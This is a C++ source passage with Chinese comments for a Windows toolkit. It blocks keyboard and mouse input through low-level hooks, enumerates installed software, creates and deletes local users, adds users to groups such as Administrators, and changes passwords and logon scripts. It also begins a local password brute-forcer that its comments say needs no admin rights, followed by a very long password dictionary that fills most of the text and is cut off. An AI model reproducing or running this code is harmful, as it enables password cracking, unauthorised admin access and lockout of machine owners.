    void Disable_Keyboard_Mouse(int pattern, HHOOK& hk, int time = 0) {
        MSG msg;
        time_t kopen = clock();
        //安装低级钩子
        if (pattern == 1) {
            hk = SetWindowsHookEx(WH_KEYBOARD_LL, Hook_ALLMessage, 0, 0);
        }
        else if (pattern == 2) {
            hk = SetWindowsHookEx(WH_MOUSE_LL, Hook_ALLMessage, 0, 0);
        }

        while (true) {
            //到达指定时长将发送一条消息，使GetMessage能接收到，加一秒浮动
            if (time > 0) SetTimer(NULL, NULL, time * 1000 + 1000, NULL);
            //阻塞函数，持续等待消息，必须调用
            GetMessage(&msg, NULL, NULL, NULL);
            int ktime = (double(clock() - kopen) / CLOCKS_PER_SEC) * 1000;
            if (ktime > (time * 1000)) break;
        }
    }

    //指定容器存放数据，指定要枚举子项的注册表位置，指定注册表预定义键(默认HKLM，1为HKCU)
    string Enum_Reg_Value(vector<string>& list, const char* pos_text, int keynum = 0) {
        //注册表项句柄
        HKEY  hKey = NULL;
        //注册表子项句柄
        HKEY subhKey = NULL;
        //注册表子项名称，此处为软件安装清单的注册表位置
        TCHAR* MainPos = char_to_tchar(pos_text);
        //要搜索的注册表子项下的子子项名称
        TCHAR subkey[260];
        //完整注册表位置，即子项名称加子子项名称
        TCHAR FullPos[260] = { 0 };
        //键值大小，根据MAX_PATH常量写死
        DWORD keylen = 260;
        //函数执行状态
        LSTATUS Status;
        //缓冲区大小
        DWORD BufSize = 0;
        //注册表位置类型
        HKEY Key_Type;
        //值
        TCHAR DisplayName[260];
        TCHAR DisplayVersion[260];
        TCHAR Publisher[260];
        TCHAR Comments[260];
        //防止中文乱码
        _wsetlocale(LC_ALL, L"");

        if (keynum == 1) Key_Type = HKEY_CURRENT_USER;
        else Key_Type = HKEY_LOCAL_MACHINE;

        //尝试打开软件安装清单注册表位置
        Status = RegOpenKeyEx(Key_Type, MainPos, 0, KEY_READ, &hKey);
        if (Status == ERROR_SUCCESS)
        {
            for (int i = 0; Status == ERROR_SUCCESS; i++) {
                BufSize = sizeof(subkey);
                //根据子项索引遍历，直到超出范围报错
                Status = RegEnumKeyEx(hKey, i, subkey, &BufSize, NULL, NULL, NULL, NULL);
                //Status = RegEnumKeyEx(hKey, i, subkey, &keylen, NULL, NULL, NULL, NULL);
                if (Status == ERROR_SUCCESS) {
                    //合并注册表位置字符串和子项字符串
                    wsprintf(FullPos, L"%s%s", MainPos, subkey);
                    //读取子项中的键值
                    Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, FullPos, 0, KEY_READ, &subhKey);
                    if (Status == ERROR_SUCCESS) {
                        //查询指定键的值，释放句柄清空缓存，保存数据
                        BufSize = sizeof(DisplayName);
                        RegQueryValueEx(subhKey, L"DisplayName", NULL, NULL, (unsigned char*)DisplayName, &BufSize);
                        BufSize = sizeof(Publisher);
                        RegQueryValueEx(subhKey, L"Publisher", NULL, NULL, (unsigned char*)Publisher, &BufSize);
                        BufSize = sizeof(DisplayVersion);
                        RegQueryValueEx(subhKey, L"DisplayVersion", NULL, NULL, (unsigned char*)DisplayVersion, &BufSize);
                        BufSize = sizeof(Comments);
                        RegQueryValueEx(subhKey, L"Comments", NULL, NULL, (unsigned char*)Comments, &BufSize);
                        list.push_back(tchar_to_string(DisplayName) + "\t\t" + tchar_to_string(Publisher) + "\t\t"
                            + tchar_to_string(DisplayVersion) + "\t\t" + tchar_to_string(Comments));
                        RegCloseKey(subhKey);
                        memset(DisplayName, 0, sizeof(DisplayName));
                        memset(Publisher, 0, sizeof(Publisher));
                        memset(DisplayVersion, 0, sizeof(DisplayVersion));
                        memset(Comments, 0, sizeof(Comments));
                    }
                }
            }
            //去重
            set<string> rep(list.begin(), list.end());
            list.assign(rep.begin(), rep.end());
            //释放
            RegCloseKey(hKey);
            return "检索完成";
        }
        return "无法打开注册表位置";
    }

    //列出电脑上已安装的程序清单(按 程序名\t备注\t出版商\t版本 格式)
    string List_Installed_Application(vector<string>& list) {
        string result;
        result = Enum_Reg_Value(list, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\");
        if (result.compare("检索完成")) return "检索HKLM->Uninstall出错";
        result = Enum_Reg_Value(list, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\");
        if (result.compare("检索完成")) return "检索HKLM->WOW6432Node->Uninstall出错";
        result = Enum_Reg_Value(list, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\", 1);
        if (result.compare("检索完成")) return "检索HKCU->Uninstall出错";
        return "检索完成";
    }

    //设置屏幕亮度
    string Set_Monitor(int mode, int args1 = 0) {
        DWORD count;
        bool status;
        //返回主监视器的句柄
        HMONITOR hmon = MonitorFromWindow(NULL, MONITOR_DEFAULTTOPRIMARY);
        //返回物理监视器数量
        status = GetNumberOfPhysicalMonitorsFromHMONITOR(hmon, &count);
        if (status) {
            //分配PHYSICAL_MONITOR结构的数组
            LPPHYSICAL_MONITOR monitor = (LPPHYSICAL_MONITOR)malloc(count * sizeof(LPPHYSICAL_MONITOR));
            if (monitor != NULL) {
                //获取数组
                GetPhysicalMonitorsFromHMONITOR(hmon, count, monitor);
                //获取物理监视器句柄
                HANDLE hmonitor = monitor[0].hPhysicalMonitor;
                //检索监视器支持的最小亮度/当前亮度/最大亮度
                if (mode == 1) {
                    DWORD max = 0;
                    DWORD cur = 0;
                    DWORD min = 0;
                    status = GetMonitorBrightness(hmonitor, &min, &cur, &max);
                    return "当前亮度："+to_string(cur)+"\n最小亮度："+to_string(min)+"\n最大亮度："+to_string(max)+"\n";
                }
                //设置屏幕亮度
                else if (mode == 2) {
                    SetMonitorBrightness(hmonitor, args1);
                    return "执行完成";
                }
                //关闭监视器句柄并释放
                DestroyPhysicalMonitors(count, monitor);
                free(monitor);
                return "指定模式错误";
            }
        }
        return "执行失败，未知错误！";
    }

    //错误提示文本
    string User_ERROR_TEXT(NET_API_STATUS Status) {
        if (Status == ERROR_ACCESS_DENIED) return "用户无权访问(需要管理员权限)";
        else if (Status == NERR_InvalidComputer) return "计算机名称无效";
        else if (Status == NERR_NotPrimary) return "该操作只允许在域的主域控制器上进行";
        else if (Status == NERR_UserNotFound) return "找不到用户名";
        else if (Status == ERROR_INVALID_PARAMETER) return "函数参数之一无效";
        else if (Status == NERR_SpeGroupOp) return "不允许对指定的特殊组进行操作，即用户组、管理员组、本地组或来宾组";
        else if (Status == NERR_LastAdmin) return "最后一个管理帐户不允许该操作";
        else if (Status == NERR_BadPassword) return "共享名或密码无效";
        else if (Status == NERR_PasswordTooShort) return "不满足密码策略要求";
        else if (Status == NERR_GroupNotFound) return "指定的本地组不存在";
        else if (Status == ERROR_NO_SUCH_MEMBER) return "指定的成员不存在";
        else if (Status == ERROR_MEMBER_IN_ALIAS) return "指定的成员已经是该本地组的成员";
        else if (Status == ERROR_INVALID_MEMBER) return "无法添加成员，帐户类型无效";
        else if (Status == NERR_GroupExists) return "该组已存在";
        else if (Status == NERR_UserExists) return "用户帐户已存在";
        else if (Status == ERROR_INVALID_PASSWORD) return "输入的密码无效";
        else return "操作失败，未知错误！";
    }

    //创建普通用户
    string Create_Normal_User(string username, string password = "") {
        USER_INFO_1 User;
        //不初始化会导致代码执行中断
        ZeroMemory(&User, sizeof(User));
        wchar_t* name = string_to_wchar(username);
        User.usri1_name = name;
        wchar_t* passwd = string_to_wchar(password);
        User.usri1_password = passwd;
        //指定用户权限级别，表示用户权限
        User.usri1_priv = USER_PRIV_USER;
        //设置用户帐户控制标志，典型用户的默认帐户类型
        User.usri1_flags = UF_NORMAL_ACCOUNT;
        NET_API_STATUS Status = NetUserAdd(NULL, 1, (LPBYTE)(&User), NULL);

        delete name;
        delete passwd;

        if (Status == NERR_Success) return "用户创建成功！";
        else return User_ERROR_TEXT(Status);
    }

    //添加用户到本地组
    string ADD_User_Group(string username, string group) {
        _LOCALGROUP_MEMBERS_INFO_3 User;
        wchar_t* name = string_to_wchar(username);
        User.lgrmi3_domainandname = name;
        wchar_t* gro = string_to_wchar(group);
        //添加用户组，严格区分大小写(如Administrators)
        NET_API_STATUS Status = NetLocalGroupAddMembers(NULL, gro, 3, (LPBYTE)(&User), 1);

        delete name;
        delete gro;

        if (Status == NERR_Success) return "成功加入用户组！";
        else return User_ERROR_TEXT(Status);
    }

    //删除用户
    string Delete_User(string username) {
        wchar_t* name = string_to_wchar(username);
        NET_API_STATUS Status = NetUserDel(NULL, name);

        delete name;
        if (Status == NERR_Success) return "删除用户成功！";
        else return User_ERROR_TEXT(Status);
    }

    //设置用户，更改密码/更改用户名/设置登录脚本
    string Change_User_Settings(string func, string username, string args1) {
        string result;
        NET_API_STATUS Status = NULL;
        wchar_t* name = string_to_wchar(username);
        wchar_t* buf = string_to_wchar(args1);
        if (!func.compare("password")) {
            Status = NetUserSetInfo(NULL, name, 1003, (LPBYTE)&buf, NULL);
            result = "更改密码";
        }
        else if (!func.compare("username")) {
            Status = NetUserSetInfo(NULL, name, 0, (LPBYTE)&buf, NULL);
            result = "更改用户名";
        }
        else if (!func.compare("script")) {
            Status = NetUserSetInfo(NULL, name, 1009, (LPBYTE)&buf, NULL);
            result = "设置用户登录脚本";
        }

        delete name;
        delete buf;
        if (Status == NERR_Success) return "用户" + result + "成功！";
        else return User_ERROR_TEXT(Status);
    }


    //使用旧密码改成新密码的方式爆破本地用户密码，并不需要管理员特权；指定用户名，模式，额外参数
    //模式0，内置1w字典爆破(预计1分钟完成)；模式1，手动尝试单个密码；模式2，自定义字典爆破
    string User_Local_Brute(string username, int mode = 0, string args1 = "") {
        NET_API_STATUS Status;
        wchar_t* name = string_to_wchar(username);
        string deflist[] = { username, "1234","12345","123456","1234567","12345678","123456789","1234567890","456123","root","admin","qwerty","qwertyui","qwertyuiop","1qaz2wsx","zxcvbnm","000000","00000000","000000000","0000000000","111111","11111111","222222","22222222","555555","666666","66666666","777777","7777777","888888","88888888","999999","99999999","password","123123","123321","87654321","987654321","9876543210","666888","66668888","112233","11223344","147258369","abc123","login","1q2w3e","1q2w3e4r","1q2w3e4r5t","654321","123qwe","qwe123","abc123","abcd1234","123123123","789456123","aaaaaa","qqqqqq","aaaaaaaa","qqqqqqqq","a123456","qq123456","a123456","a1234567","a12345678","a123456789","iloveyou","31415926","12344321","asdfghjk","asdfghjkl","123456abc","0123456789","121212","12121212","qazwsx","qazwsxedc","12341234","110110110","asdasd","asdasdasd","abc123456","1234qwer","qwer1234","123456789a","aa123456","asdfasdf","520520520","963852741","741852963","asd123456","qweasdzxc","111222","11112222","qweqweqwe","521521521","asdf1234","12345678a","woaini1314","1234abcd","1qazxsw2","woaiwojia","321321321","123456789","12345678","11111111","dearbook","00000000","123123123","1234567890","88888888","111111111","147258369","aaaaaaaa","987654321","1111111111","66666666","a123456789","11223344","1qaz2wsx","password","xiazhili","789456123","qwertyuiop","qqqqqqqq","iloveyou","qq123456","87654321","000000000","asdfghjkl","31415926","12344321","1q2w3e4r","0000000000","qazwsxedc","123456abc","abcd1234","0123456789","123654789","12121212","asdasdasd","12341234","110110110","abc123456","aa123456","a12345678","22222222","a1234567","1234qwer","123456","123321123","qwertyui","123456123","123456789a","123456aa","asdfasdf","99999999","999999999","123456123456","520520520","963852741","55555555","741852963","33333333","qwer1234","asd123456","qweasdzxc","zzzzzzzz","77777777","code8925","11112222","ms0083jxj","123456qq","qweqweqwe","111222333","asdf1234","3.1415926","asdfghjk","147852369","q1w2e3r4","521521521","12345678A","123qweasd","123698745","1123581321","1234abcd","WOAINI1314","1qazxsw2","woaiwojia","!@","zxcvbnm123","321321321","05962514787","wwwwwwww","123456987","kingcom5","5845201314","","0987654321","11111111111111111111","123456asd","1q2w3e4r5t","12345600","lilylily","11235813","10101010","xiaoxiao","woshishui","qwe123456","12345612","5201314520","1234554321","woaini123","12301230","123456654321","ffffffff","111111","1122334455","12369874","1234567a","12345679","123456aaa","buzhidao","100200300","qazwsx123","z123456789","woainima","ssssssss","P@ssw0rd","44444444","aaa123456","q123456789","WOJIUSHIWO","qaz123456","wocaonima","123321aa","25257758","csdncsdn","1357924680","yangyang","woaini520","369258147","zhang123","321654987","9876543210","1233211234567","1234567b","zxczxczxc","dddddddd","google250","5845211314","aaaaaaaaa","abcdefgh","369369369","123456QWE","20082008","goodluck","zxc123456","135792468","qwerasdf","299792458","computer","12qwaszx","a1111111","AS123456","123456789.","12345678910","168168168","888888888","a123456a","superman","789789789","8888888888","qq123123","abc12345","xxxxxxxx","sunshine","zaq12wsx","112233445566","a1b2c3d4","aptx4869","qq111111","123321123321","52013145201314","66668888","007007007","wodemima","147896325","1a2b3c4d","123789456","aaaaaaaaaa","jingjing","12345qwert","helloworld","110120119","tiantian","123456ab","13145200","aaaa1111","00001111","123456..","a123123123","a5201314","12312312","zhangwei","w123456789","584131421","123456789q","77585210","abcd123456","qw123456","ab123456","li123456","passw0rd","20102010","666666666","12348765","1234512345","456456456","20080808","newhappy","csdn.net","wangjian","12345687","01234567","01020304","21212121","dongdong","qazqazqaz","123123123123","13141314","23232323","wiii2dsE","74108520","7894561230","5841314520","a11111111","aa123123","Q1W2E3R4T5","woaini521","77585211","shanghai","88771024","123qwe123","123456as","19491001","qq000000","WANG123456","01010101","qqq11111","ZZ123456","14789632","abc123456789","111111aa","q1234567","yuanyuan","qazxswedc","3141592653","meiyoumima","77585217758521","liu123456","12345abcde","20092009","1234567890123","110119120","zhanglei","012345678","77889900","mmmmmmmm","123456000","justdoit","19841010","lb851210","qq123456789","qwert12345","7758521521","hahahaha","aini1314","llllllll","11111111a","123456798","13131313","19841020","10203040","123456zx","23456789","mingming","000000","12345678A@","asasasas","chenchen","worinima","52013141314","123454321","123456qaz","QQQQQqqqqq","1111qqqq","1234asdf","woailaopo","123456abcd","518518518","wangjing","88982866","z3255500","11110000","5201314a","258258258","584131420","987456321","qq5201314","12365478","88889999","q1111111","qqqqqqqqq","00000000000000000000","q12345678","www123456","123123aa","ZX123456","qweasd123","123123456","19871010","45612300","1234567899","25251325","19850603","administrator","a0000000","longlong","52013140","nicholas","120120120","19841028","kkkkkkkk","tzwadmin123","asdf123456","333333333","wangpeng","911911911","admin123","jjjjjjjj","microsoft","19871024","66778899","hyjzstx8","78787878","lovelove","qwqwqwqw","wangwang","123456qw","16897168","a1s2d3f4","cccccccc","z1234567","love1314","12332100","456789123","a00000000","aaa123123","hhhhhhhh","qqqq1111","xiaolong","xiaoqiang","xingxing","zhangjian","zxcv1234","19851019","ds760206","pppppppp","19841012","19851010","1qaz1qaz","111111qq","1314520520","19871025","55667788","gggggggg","wobuzhidao","1111111a","1111AAAA","12300000","13572468","miaomiao","w12345678","19861012","19871020","abcde12345","imissyou","qwe123123","123456789abc","19881011","asd12345","internet","qwe12345","123456789123","nihao123","zhimakaimen","1223334444","19881010","qwerty123","19861020","w1234567","woainiWOAINI","yyyyyyyy","1qaz2wsx3edc","84131421","wangyang","zhangjie","testtest","z12345678","zhanghao","456123789","12131415","99998888","shanshan","11111111111","19890309","asdfjkl;","hello123","5555555555","5841314521","110120130","ABC12345678","19861015","xiaofeng","112112112","12312300","1q1q1q1q","3141592654","56565656","dgdg7234322","liangliang","159159159","19841023","19841025","19881212","19890306","98765432","zhangjing","00123456","19841018","19861210","00112233","119119119","123456456","19861010","19871125","123123qq","12345678Q","5201314123","19830209","19881120","1qaz@WSX","98989898","19851212","19861028","147147147","222222222","6666666666","asd123123","1029384756","19861123","19841001","19871212","89898989","oooooooo","tingting","woshitiancai","19861018","19871987","789654123","mm123456","121121121","123456ok","19881128","58585858","zaq1xsw2","123456zz","wangchao","19871023","19881028","19841015","19871011","19871021","19881020","123456780","123abc123","19861016","19861111","19881220","314159265","asdasd123","123456zxc","19821010","19861026","19861215","19871028","369852147","1212121212","13145201314520","19841024","beijing2008","19841026","19861212","19870623","19871012","555555555","dingding","12332112","12345611","159753123","19861023","19861025","19871015","aa111111","dg123456","huang123","q11111111","windowsxp","19841021","handsome","zhangyan","123456...","19851020","19861001","19861011","19871001","19881015","12345689","19841014","584201314","asdfzxcv","woshishei","zxcvbnma","11221122","1231512315","16899168","19851120","19871016","19871214","a1314520","zhangyang","chenjian","wang1234","19851218","19871225","19881225","963258741","lingling","qwertyuio","19871120","19871228","888888","qwerqwer","001001001","123581321","19851125","19871017","19881022","19881024","chinaren","huanhuan","songguang","100100100","19861021","@","tsinghua","123456789z","19861216","19881017","zhongguo","0.123456","19851023","19860202","19861013","19881013","13324016206","19841011","19861218","19871026","19881016","134679852","19841019","19861024","560111aa","qkvmlia569","19841027","19861211","19861220","zxcvbnmzxcvbnm","123654123","19861121","19881018","520131400","789632145","zxcvbnm1","12345ABC","1237890o0","19821221","19821982","19861124","19871022","19881125","19841017","19861120","19871121","19871122","5200251314","........","123456asdf","159357159357","19831010","19871029","abcabcabc","admin888","kingking","l123456789","123qweasdzxc","18181818","19851025","19881123","jianqiao","14141414","19831220","19851013","haohaoxuexi","qwe123qwe","zhanghui","123698741","19861224","19861225","74107410","159357123","19861014","19861122","19871210","19881021","19881210","88886666","19841122","19851216","19851230","19861022","19870214","19881001","19881023","68686868","amuqdedwft","woaiwoziji","zxzxzxzx","123456321","19821024","19860214","ddzj39cb3","operation","support123","19831001","19861112","11111112","12345677","19861214","19881027","19891010","301415926","ww123456","19851011","19851012","19881029","msconfig","poiuytrewq","09876543","19821016","19871103","19871223","777888999","951ljb753","zhangjun","111111111111","123456788","123654987","19810914","19841022","19851018","19861125","19861228","19871126","10002000","19851001","19851030","19871013","55556666","777777777","aaaa0000","zaiwa1124","1234567q","19831111","19841984","19871002","19871129","200919ab","3366994qaz","chen123456","l12345678","TTTTTTTT","123456qwerty","19821120","19861226","19881012","19881228","09090909","19851015","19851121","19851210","19861103","19870101","19870825","19870909","19871123","19871127","19871226","19881002","19881226","qweqwe123","19821012","19821128","19851205","19851225","19861128","19861223","19871027","19871218","19881025","19881129","cs123456","wo123456","yingying","zhangtao","zxcasdqwe","19851123","19861017","19861019","19881127","bbbbbbbb","cc123456","wangyong","woshizhu","1111111q","19851214","19871213","19880808","liuqiang","19841006","19841013","19860713","19871215","19881215","741258963","19841005","19841029","19851016","19860128","19861113","19871111","19871115","19871211","83869247","abc123abc","woshishen","xiaoming","123123","19821023","19841002","19841210","19851024","19851224","19861030","19871221","19881014","19881218","fangfang","wangliang","12356789","19831020","19841120","19841123","19851028","19851226","19860101","19861027","19861108","19861127","19870815","19881112","19881118","a7758521","howareyou","13141516","19841016","19861002","19861029","19881026","9638527410","bugaosuni","QINGQING","wangdong","12345678900","123456bb","19841212","19851102","19861126","333666999","jack123456","jiangnan","yy123456","123321456","12345671","19831120","19851022","19861221","19890101","200401265","hao123456","zxcvbnmm","19831012","19831125","19861110","19861118","19861206","19871014","19871124","19871229","19881122","19881214","cndkervip","lxqqqqqq","nishishui","wanggang","19851211","19861986","19870626","19871019","19871227","19881126","78963214","90909090","qwert123","00000001","123456789qq","13149286ab","159753159753","19831024","19851026","19851213","19870604","19871201","19891120","2222222222","96385274","mac123456","Qaz12345","wangying","10000000","123456789+","19831124","19861102","19861213","19881124","abcdefg123","baidu1599","caonima123","supervisor","100200100200","19851118","19851219","19871104","19871128","19871203","jianjian","qawsedrf","zhangxin","123456789@","19831118","19851113","19851116","19851220","19861203","19870216","19871030","19871208","19871222","19881213","19891026","99887766","9999999999","jiaojiao","s123456789","zhangzhang","001002003","125125125","19851111","19871118","7708801314520","7758521a","85208520","admin369","19821025","19851017","19861104","19861106","19870923","19871004","19871207","19871209","19871216","19880101","19881115","19881988","51201314","csdn123456","wangfeng","YU123456","19821116","19831013","19831212","19851215","19861006","19861205","19870621","19871018","19881111","19881116","19891011","maidoumaidou","12345654321","1234567891","19861119","19861129","19870125","19870201","19870620","20052005","55665566","7758521520","asdffdsa","asdqwe123","rongfan66","19821001","19821122","19841205","19871005","19871205","19871220","19881121","nishizhu","19820814","19821018","19831213","19831218","19851112","19861003","19870627","19871102","19871117","19880214","65432100","qianqian","zhangchao","zhangpeng","01230123","192837465","19841125","19851217","19851223","19860126","19860909","19871110","19880211","19881114","19891020","1q2w3e4r5t6y","1qa2ws3ed","ss123456","test1234","zaqxswcde","123456789*","19821028","19851126","19851204","19851229","19861227","19870202","19870606","19871217","19881216","19891024","mengmeng","windows123","19831011","19831025","19831027","19841108","19861217","19871108","woaimama","zzzzzzzzz","19831015","19831023","19831129","19841007","19841124","19841127","19861208","19861219","19871112","19891225","abcd12345","caonimabi","fa1681688","qazwsxed","xx123456","zhangqiang","zhouzhou","*********","19821207","19861230","19871008","19871116","19881211","19881217","19881224","19881229","huangwei","19851014","19851221","19870618","19881008","19881117","19999999","31496081","!QAZ2wsx","123456qqq","19831106","19841004","19841225","19841226","19851122","19851124","19861222","19870628","19870629","19891012","19891015","19891023","china6815","fengfeng","lkjhgfdsa","x123456789","12345666","1415926535","19821017","19821022","19821212","19831028","19841220","19851003","19851128","19851985","19861105","19870102","19871105","19881030","19891021","52001314","95279527","19831021","19851005","19851228","19861209","19870608","19870917","19871224","19881208","19891989","31415926535","adminadmin","asdfqwer","jiangwei","jiushiaini","qqq123456","stefanie","wonderful","159357456","19821021","19821026","19821208","19831105","19831126","19851027","19861115","19870619","19870911","19880828","19881113","52113145211314","584211314","666666","wangzhen","youaifa569","00000000a","05413330","19821019","19821224","19831016","19831226","19841030","19841219","19861101","19870310","19871109","19871206","19881005","19881110","19891215","20202020","5201314.","hhxxttxs","000123456","12345670","12345688","19851227","19870921","19871204","19891028","25252525","7215217758991","asdfgh123","bingbing","zhangbin","10241024","19841213","19851115","19860921","19881201","19891221","AAAA1234","asdfg12345","nclpf2p4","ykvpoia569","ZHANGLIANG","19831123","19841113","19850101","19851105","19851127","19860210","19870625","19881119","19881219","19881223","19891019","19891022","1a2s3d4f","abc123123","asd123asd","mimamima","weiweiwei","youkofa569","123456789qaz","19821123","19821218","19831026","19831112","19831211","19831224","19841003","19841111","19851029","19860916","19861008","19861117","19891016","19891124","19891224","asdfg123","huangjie","123321","19821013","19831210","19831219","19841228","19851002","19861109","19861229","19870128","19880901","19881221","19891212","36363636","download","sun123456","yang123456","19821014","19821213","19831007","19831014","19831018","19831122","19841008","19841217","19851006","19860902","19870708","19881108","19891025","5211314521","jiang123","l1234567","12346789","19811025","19830920","19831208","19841101","19841126","19851021","19851101","19861201","19870824","19870912","19870913","19871101","19880202","19881019","19891001","19891006","201314201314","987412365","hellohello","xiaojing","yangchao","000000aa","19821020","19831121","19831216","19851110","19860911","19861202","19870925","19881227","19891216","700629gh","77585211314","pingping","wangning","xiaojian","zhang123456","19821215","19831022","19841218","19861107","19861114","19870129","19870203","19870205","19870210","19870818","19880218","19881103","27105821","315315315","abc111111","chenchao","feixiang","qqqqwwww","123456789123456789","16888888","19820101","19831215","19831225","19841224","19851008","19851106","19861007","19861204","19870103","19870212","19870213","19871009","19880125","19891013","xuanxuan","zhangkai","ZZZZZZZZZZ","0.123456789","123!@","19831101","19841121","19841230","19851114","19860228","19860927","19870615","19870624","19870819","19871006","19871007","19890214","19891228","aabbccdd","csdn1234","lv80066368","thankyou","WANGSHUAI","workhard","xiaodong","ybnkoia569","12332111","19821030","19821225","19831227","19841203","19851129","19870603","19871119","19880312","19881006","19890122","19891017","21876346a","37213721","5i5i5i5i","qingfeng","wangming","wangqiang","woshiniba","xj123456","yangguang","yangjian","00009999","12345789","1357913579","19821015","19821129","19840921","19841211","19841221","19850809","19851107","19851203","19851208","19861005","19861207","19870209","19870601","19870810","19870919","19871106","19881003","19881004","19881130","19891226","chen1234","happy123","rilidongl","19811010","19831983","19860315","19870215","19880928","19891030","19891213","52013141","88488848","f19841205","ly123456","qq1314520","s2j3l9v5","tangtang","11111122","123456789w","19821118","19831128","19831214","19841103","19841119","19860926","19870520","19870808","19870903","19871107","19880310","19881109","53231323","987987987","butterfly","ll123456","pengpeng","rongrong","wangmeng","zhangying","1010101010","13145210","19821102","19831221","19840101","19841116","19850923","19851104","19870206","19870208","19870225","19871219","19880217","19880428","19881202","5205201314","football","qazwsx12","qq123321","s1234567","xiaoyang","123123123a","123123qwe","19811017","19821002","19851201","19860217","19860917","19861009","19861116","19870207","19871114","19880108","19880203","19880212","19880816","22334455","541881452","7758521123","paradise","s12345678","xiaogang","19831102","19831108","19851119","19860125","19870916","19870927","19880809","19891029","19891122","20062006","3.141592653","gujinbiaoaa","laopo521","zhendeaini","1213141516","123456654","13801001020","19821121","19821126","19831230","19841105","19860103","19860314","19870121","19870220","19870915","19870926","19871003","19880120","19881102","19881106","19891027","19891104","19891123","52105210","77582588","963963963","iloveyou1314","wiiisa222","123456xx","131452000","19801980","19821230","19840102","19841215","19860303","19860923","19870305","19880124","19880206","19891130","abc123abc123","Fuyume123","lin123456","qwerty123456","tiankong","whoareyou","xiangxiang","xxwwan1314","zxcvzxcv","19821216","19840129","19840211","19841208","19841214","19851109","19860814","19860816","19870123","19870217","19870301","19870616","19870617","19870707","19870820","19870828","19870918","19870920","19880126","19880311","19880921","19881206","chenliang","niaishui","okokokok","123456789aa","19821029","19821220","19831008","19841107","19850102","19851117","19870120","19870228","19870801","19871230","19880215","19881107","19881204","19891128","20000000","456852456852","a1b2c3d4e5","adgjmptw","gogogogo","password123","q1q1q1q1","wanghuan","woshinidie","ZHANGMING","0054444944","0147258369","19811026","19821008","19821027","19821115","19831103","19841129","19841130","19841206","19841229","19860929","19861004","19870928","19871202","19890228","beautiful","huanghao","kk123456","Password1","thinkpad","wu123456","123456ww","147896321","19821011","19831127","19831201","19831228","19840120","19840214","19840420","19850105","19851007","19851209","19860102","19860606","19860625","19860820","19870112","19870609","19870611","19870622","19880123","19880209","19890806","19890818","33445566","aaaassss","haohaohao","qq12345678","159753456","19831003","19831009","19840823","19841102","19841204","19850711","19860924","19870113","19870211","19870303","19870605","19870614","19870701","19870904","19870907","19880712","19880815","19881209","19891121","1a2b3c4d5e","abcs369","apple123","chenfeng","KANGKANG","wokaonima","yangjing","19811028","19821101","19821106","19821112","19831217","19840926","19870218","19870221","19870821","19880228","19880307","19880606","19880915","19890301","19891116","20090909","21345678","25802580","86868686","aa123456789","amp12345","h123456789","qazhuang123","westlife","woxiangni","123123321","19821104","19821226","19830915","19851231","19860212","19870525","19870612","19870823","19880118","19880523","19880926","19881205","19890201","19891127","19891201","19891211","19891218","52013145","775852100","7777777777","77778888","987654123","songsong","xixihaha","19821006","19821130","19821205","19821210","19821211","19821217","19821219","19830214","19831029","19831113","19831204","19831205","19840925","19841115","19850926","19860120","19860925","19870602","19870728","19881101","19881203","19890205","19890206","19891018","19891110","19891125","45454545","abc112233","ABCABC123","foreverlove","goo78leeg","qq1234567","yang1234","zy123456","zycggytkqb","0000000a","04020323","1111122222","123456789987654321","123abc456","19821124","19830202","19830418","19831019","19831206","19850215","19850909","19850921","19851222","19860211","19860912","19870325","19870503","19870521","19870811","19870914","19880326","19880601","19891002","19891206","19891219","20022002","22223333","eladnbin1104","qazwsxedcrfv","slamdunk","zhangyong","%null%","%username%","!@#$","!@#$%","!@#$%^","!@#$%^&","!@#$%^&*","1","101010","111","1111111","123","123abc","123go","1313","131313","1314520","147258","168168","1p2o3i","2222","2222222","333333","369","4444","520","5201314","520520","54321","5555","5683","7758521","7758258","777","7777","789456","790119","80486","888999","960628","987654","@#$%^&","a","aaa","abc","abcd","abcde","abcdef","abcdefg","access","action","active","adam","adidas","adrian","aggies","aikman","airhead","alaska","albert","alex","alexande","alexandr","alexis","alfred","alice","alicia","aliens","alison","allen","allison","allo","alpha","alpine","alyssa","amanda","amber","amelie","america","amiga","amour","amy","anderson","andre","andrea","andrew","andy","angel","angela","angels","angie","angus","animal","animals","anna","anne","annie","anthony","apache","apollo","apple","apples","april","archie","arctic","ariane","ariel","arizona","arthur","artist","asdf","asdfg","asdfgh","asdfjkl","aspen","ass","asshole","asterix","ath","athena","attila","august","austin","author","avalon","avatar","awesome","aylmer","babies","baby","babylon","bach","badboy","badger","bailey","balls","bamboo","banana","bananas","banane","bandit","barbara","barbie","barney","barry","basebal","baseball","basf","basil","basket","basketb","basketba","bastard","batman","beagle","beaner","beanie","bear","bears","beatles","beautifu","beaver","beavis","beer","belle","benjamin","benny","benoit","benson","bernard","bernie","bertha","betty","bigbird","bigdog","bigfoot","bigmac","bigman","bigred","bilbo","bill","billy","bingo","binky","biology","bird","birdie","bitch","biteme","black","blackie","blaster","blazer","blizzard","blonde","blondie","blowfish","blowme","blue","bluebird","bluesky","bmw","bob","bobby","bobcat","bond","boner","bonjour","bonnie","booboo","booger","boogie","bookit","boomer","booster","boots","bootsie","boris","boss","boston","bowling","bozo","bradley","brandi","brandon","brandy","brasil","braves","brazil","brenda","brewster","brian","bridge","bridges","bright","broncos","brooke","browns","bruce","brutus","bubba","bubbles","buck","buddha","buddy","buffalo","buffy","bull","bulldog","bullet","bullshit","bunny","business","buster","butch","butler","butthead","button","buttons","buzz","byteme","cactus","caesar","caitlin","californ","calvin","camaro","camera","campbell","camping","canada","canced","cancer","candy","canela","cannon","cannonda","canon","captain","cardinal","carl","carlos","carmen","carol","carole","carolina","caroline","carrie","cascade","casey","casio","casper","cassie","castle","cat","catalog","catfish","cats","cccccc","cedic","celica","celine","celtics","center","cesar","cfi","cfj","cgj","challeng","champion","champs","chance","chanel","changeme","chaos","chapman","charity","charles","charlie","charlott","cheese","chelsea","cherry","cheryl","chester","chevy","chicago","chicken","chico","chiefs","china","chip","chipper","chiquita","chloe","chocolat","chris","chrissy","christ","christia","christin","christop","christy","chuck","chucky","church","cinder","cindi","cindy","claire","clancy","clark","class","classroo","claude","claudia","cleaner","clipper","cloclo","clover","cobra","cocacola","coco","coffee","coke","colleen","college","colorado","coltrane","columbia","compaq","compton","compute","concept","connect","connie","conrad","control","cookie","cookies","cool","coolman","cooper","copper",